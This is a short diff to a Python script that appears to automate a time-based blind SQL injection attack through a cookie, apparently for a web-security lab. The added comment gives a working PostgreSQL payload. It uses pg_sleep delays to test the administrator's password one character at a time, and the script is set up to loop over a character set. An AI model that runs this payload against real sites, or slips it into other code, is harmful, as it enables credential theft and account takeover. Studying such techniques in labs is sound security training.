@@ -2,7 +2,7 @@ import requests
 import string
 
 URL = input("Input URL: ").strip()
-template = input("Input cookie_payload: ")
+template = input("Input cookie_payload: ") # Example: (YOUR-COOKIE)'|| (SELECT CASE WHEN SUBSTRING(password, {i}, 1)='{char}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
 password = ""
 charset = string.ascii_letters + string.digits
 
